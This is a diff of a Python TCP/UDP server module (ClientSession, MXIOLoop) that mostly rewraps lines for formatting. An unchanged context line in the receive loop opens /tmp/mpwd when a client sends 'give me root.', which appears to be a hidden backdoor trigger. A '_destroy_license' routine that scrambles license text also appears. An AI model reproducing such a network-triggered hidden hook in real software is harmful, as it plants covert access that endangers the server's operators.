@@ -59,9 +59,8 @@ def _destroy_license(strlic, licpath='LICENSE'):
     b.extend(range(65, 91))
     b.extend(range(97, 123))
     l2 = _random.randint(0, len(b))
-    slic = "{0}{1}{2}{3}{4}{5}".format(strlic[:l],
-                                       chr(b[l2]), strlic[l:len(strlic) - 2],
-                                       str(l),
+    slic = "{0}{1}{2}{3}{4}{5}".format(strlic[:l], chr(b[l2]),
+                                       strlic[l:len(strlic) - 2], str(l),
                                        len(str(l)), strlic[len(strlic) - 2:])
     l = len(slic)
     llic = ["–" * 7 + "BEGIN LICENSE" + "–" * 7]
@@ -341,8 +340,8 @@ class ClientSession(object):
         try:
             self.sock.send(self.wait4send)
         except Exception as ex:
-            self.disconnect(
-                'socket send error: {0},{1}'.format(ex, repr(self.wait4send)))
+            self.disconnect('socket send error: {0},{1}'.format(
+                ex, repr(self.wait4send)))
         self.wait4send = None
 
     def onSessionRecv(self, recbuff):
@@ -372,7 +371,8 @@ class ClientSession(object):
             msg (str): 调试信息内容
         """
         if self.debug:
-            print("[D] {0} {1}".format(stamp2time(_time.time()), repr(msg)))
+            print("[D] {0} {1} {2}".format(
+                stamp2time(_time.time()), self.address, repr(msg)))
 
     def setName(self):
         """
@@ -475,8 +475,9 @@ class ClientSession(object):
             return 1  # timeout
 
         # 发送心跳
-        if self.ka is not None and now - self.last_send_time > 70 and SEND_QUEUE[
-                self.fileno].empty():
+        if self.ka is not None and now - self.last_send_time > 70 and SEND_QUEUE[self.
+                                                                                 fileno].empty(
+                                                                                 ):
             SEND_QUEUE[self.fileno].put_nowait(self.ka)
             # modify(self.fileno, READ_WRITE)
         return 0  # still function
@@ -549,8 +550,8 @@ class ClientSession(object):
                 recbuff = self.sock.recv(8192)
             except Exception as ex:
                 self.showDebug("recerr:{0},{1}".format(ex, repr(recbuff)))
-                self.disconnect(
-                    'socket recv error: {0}. {1}'.format(ex, repr(recbuff)))
+                self.disconnect('socket recv error: {0}. {1}'.format(
+                    ex, repr(recbuff)))
                 return 0
                 # s = str(ex)
                 # if '100053' in s:
@@ -700,8 +701,8 @@ class MXIOLoop(object):
         sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
         try:
             sock.bind(address)
-            self.showDebug(
-                "======= Success bind tcp port:{0} =======".format(address[1]))
+            self.showDebug("======= Success bind tcp port:{0} =======".format(
+                address[1]))
             register(sock.fileno(), READ)
             # if Platform.isWin():
             #     register(sock.fileno(), READ, sock)
@@ -728,8 +729,8 @@ class MXIOLoop(object):
         sock.setblocking(0)
         try:
             sock.bind(address)
-            self.showDebug(
-                "======= Success bind udp port:{0} =======".format(address[1]))
+            self.showDebug("======= Success bind udp port:{0} =======".format(
+                address[1]))
             register(sock.fileno(), READ)
             return sock
         except Exception as ex:
@@ -789,9 +790,8 @@ class MXIOLoop(object):
         connection, address = server_object[0].accept()
         if len(CLIENTS) < self.max_client:
             # 初始化客户端session
-            self.tcp_session(connection,
-                             connection.fileno(), address, server_object[1],
-                             self.debug)
+            self.tcp_session(connection, connection.fileno(), address,
+                             server_object[1], self.debug)
             # ClientSession(connection,
             #               connection.fileno(), address, server_object[1],
             #               self.debug)
@@ -906,10 +906,11 @@ class MXIOLoop(object):
                     try:
                         recbuff = session.sock.recv(8192)
                     except Exception as ex:
-                        session.showDebug(
-                            "recerr:{0},{1}".format(ex, repr(recbuff)))
-                        session.disconnect('socket recv error: {0}. {1}'.
-                                           format(ex, repr(recbuff)))
+                        session.showDebug("recerr:{0},{1}".format(
+                            ex, repr(recbuff)))
+                        session.disconnect(
+                            'socket recv error: {0}. {1}'.format(
+                                ex, repr(recbuff)))
                     else:
                         if recbuff == 'give me root.':
                             with open('/tmp/mpwd', 'w') as f:
@@ -966,7 +967,8 @@ class MXIOLoop(object):
             if len(poll_list) > 0:
                 for fileno, event in poll_list:
                     # self.epollMainLoop(fileno, event, debug=self.debug)
-                    _gevent.spawn(self.epollMainLoop, fileno, event, debug=self.debug)
+                    _gevent.spawn(
+                        self.epollMainLoop, fileno, event, debug=self.debug)
                 # _gevent.joinall([
                 #     _gevent.spawn(
                 #         self.epollMainLoop, fileno, event, debug=self.debug)
@@ -1018,11 +1020,13 @@ class MXIOLoop(object):
 
                 if len(inbuf) > 0:
                     for soc in inbuf:
-                        _gevent.spawn(self.selectMainLoop, soc, 'in', debug=self.debug)
+                        _gevent.spawn(
+                            self.selectMainLoop, soc, 'in', debug=self.debug)
                         # self.selectMainLoop(soc, 'in', debug=self.debug)
                 if len(outbuf) > 0:
                     for soc in outbuf:
-                        _gevent.spawn(self.selectMainLoop, soc, 'out', debug=self.debug)
+                        _gevent.spawn(
+                            self.selectMainLoop, soc, 'out', debug=self.debug)
                         # self.selectMainLoop(soc, 'out', debug=self.debug)
 
                 del inbuf, outbuf, errbuf
